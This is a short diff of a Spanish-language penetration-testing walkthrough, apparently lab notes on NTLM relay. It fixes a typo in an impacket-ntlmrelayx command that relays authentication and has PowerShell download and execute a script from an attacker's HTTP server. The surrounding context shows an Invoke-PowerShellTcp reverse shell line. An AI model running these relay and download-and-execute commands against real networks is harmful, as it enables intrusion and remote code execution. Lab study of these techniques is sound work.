@@ -34,7 +34,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.11.10 -Port 4444
 
 Ejecutamos nuestro Ntlmrelay con la ejecucion de la peticion a nuestro servidor de python 
 ```
-sudo impacket-ntlmrelayx -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient ).downloadString( 'http://10.10.11.10:8000/PS.psi|')"
+sudo impacket-ntlmrelayx -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient ).downloadString( 'http://10.10.11.10:8000/PS.ps1')"
 ```
 
 Guia Visual 
